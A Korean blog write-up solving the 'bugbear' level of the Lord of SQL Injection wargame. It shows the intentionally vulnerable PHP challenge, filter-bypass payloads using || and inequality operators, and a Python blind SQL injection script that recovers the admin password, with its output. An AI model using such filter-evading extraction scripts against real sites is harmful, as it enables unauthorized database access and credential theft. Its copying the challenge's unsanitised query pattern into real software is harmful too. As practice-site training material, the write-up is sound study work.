---
title: "[Lord of SQL Injection] LoS - bugbear 문제풀이"
date: 2018-08-01
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번 문제는 `생각 전환`의 필요성에서 살짝 느꼈던 문제였다.
뭔가 허점을 찌르는 느낌이었다.
`bugbear`라는 문제이다.  

<!--more-->

코드는 다음과 같다.  

```php
------------------------------------------------------------------------------------------------
query : select id from prob_bugbear where id='guest' and pw='' and no=
------------------------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```

필터링을 보면 뭔가 굉장히 빡세게 걸려있다.
이 전 문제들에서 사용했던 것들이 대부분 막혀있다.
하지만 다행인건, `&&`와 `||`은 사용할 수 있다는 것이다.
그래도 아직 `like`과 `=`를 사용할 수 없기 때문에 비교를 할 수 없다.
아니 정정하자면, `같은지` 비교를 할 수 없다.  

그럼 반면, 내가 입력한 값보다 `큰지 혹은 작은지`는 비교할 수 있다.
이 때문에 나는 `부등호`를 사용해서 문제를 풀었다.
내가 많이 고민했던 부분은 `id='admin'`을 사용할 수 없다는 점이었다.
`admin`의 `pw`를 출력하긴 해야 하는데, `id='admin'`을 그 어떤 방법으로도 비교할 수 없어 보였다.

그래서 `부등호를 사용해 비교할 수 있는 값`에 초점을 맞추어 다시 문제를 보았다.
그러다 눈에 띈 것이 `no`였다.
아마도 다른 문제들처럼, 각각의 계정에 `no` 값이 부여되어 있을 것이다.
때문에 부등호를 이용 해 `no`를 비교한다면, `id`가 `admin`인 행을 구할 수 있지 않을까 생각했다.
이를 확인하기 위해 아래와 같이 입력 해 보았다.  

```plain
?pw=1&no=1||no<2
```

그랬더니 `Hello guest`가 출력되었다.
이것저것 시도 해 보니, `?pw=1&no=1||no>1`을 입력하니 `Hello admin`을 얻을 수 있었다.
일단 `id`가 `admin`인 행을 구할 수 있으니, `pw`의 길이와 값은 이 전 문제와 동일하게 `length()`와 `min()`를 사용하고, 부등호를 통해 비교하게 하면 될 것이다.
또한 만약 `Hello admin`이 출력 된다면 그 값이 아니라 `해당 값 - 1`을 길이 혹은 pw의 일부라고 생각하면 된다.
이를 토대로 아래와 같이 코드를 구현했다.  

```python
import requests

flag = ""
length = 0

url = "http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&no=0||no"
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 20):
	try:
		query = url + ">1%26%26length(pw)<" + str(i)
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue

	if 'Hello admin' in r.text:
		length = i - 1
		break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + ">1%26%26mid(pw," + str(j) + ",1)<char(" + str(i) + ")"
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if 'Hello admin' in r.text:
			flag += chr(i - 1)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

너무 한번에 결과가 나와서 당황했는데, 다행히 제대로 된 `pw`를 얻을 수 있었다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  8
[+] Find password
[+] Found 1 : 5
[+] Found 2 : 52
[+] Found 3 : 52D
[+] Found 4 : 52DC
[+] Found 5 : 52DC3
[+] Found 6 : 52DC39
[+] Found 7 : 52DC399
[+] Found 8 : 52DC3991
[+] Found password :  52DC3991
[+] End
```

이전 문제들처럼 알파벳 소문자로 바꿔서 아래와 같이 입력하면 문제가 풀린다.  

```plain
?pw=52dc3991
```

---

```php
------------------------------------------------------------------------------------------------------------
query : select id from prob_bugbear where id='guest' and pw='52dc3991' and no=
------------------------------------------------------------------------------------------------------------

BUGBEAR Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
BUGBEAR Clear!!
```